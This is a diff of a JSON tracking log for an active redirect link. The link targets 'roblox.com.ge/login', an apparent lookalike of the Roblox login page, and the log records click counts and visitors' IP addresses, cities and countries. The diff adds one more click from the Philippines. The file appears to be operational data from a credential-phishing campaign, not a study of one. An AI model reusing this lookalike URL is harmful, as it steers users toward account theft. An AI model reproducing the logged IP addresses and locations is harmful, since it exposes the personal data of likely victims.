@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1533,
+    "useCount": 1534,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12430,6 +12430,14 @@
         "ip": "180.191.73.57",
         "country": "Philippines",
         "city": "City of Muntinlupa",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777448503841,
+        "ip": "120.28.220.182",
+        "country": "Philippines",
+        "city": "Cagayan de Oro",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
